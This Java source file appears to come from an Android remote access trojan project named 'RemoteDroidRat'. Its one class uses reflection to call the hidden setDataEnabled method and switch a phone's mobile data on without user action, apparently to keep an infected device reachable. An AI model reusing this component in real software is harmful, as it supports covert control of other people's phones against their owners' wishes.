package com.KaranKumar.RemoteDroidRat.utiles;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.telephony.TelephonyManager;

public class MobileDataUtils {

    public static void enableMobileData(Context context) {
        ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);

        if (connectivityManager != null && telephonyManager != null) {
            NetworkInfo mobileInfo = connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);

            if (mobileInfo != null) {
                if (!mobileInfo.isConnected()) {
                    try {
                        // Use reflection to invoke hidden method setMobileDataEnabled
                        // Note: This may not work on all devices due to restrictions
                        TelephonyManager telephonyService = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
                        if (telephonyService != null) {
                            java.lang.reflect.Method setMobileDataEnabledMethod = telephonyService.getClass().getDeclaredMethod("setDataEnabled", boolean.class);
                            if (setMobileDataEnabledMethod != null) {
                                setMobileDataEnabledMethod.invoke(telephonyService, true);
                            }
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
        }
    }
}
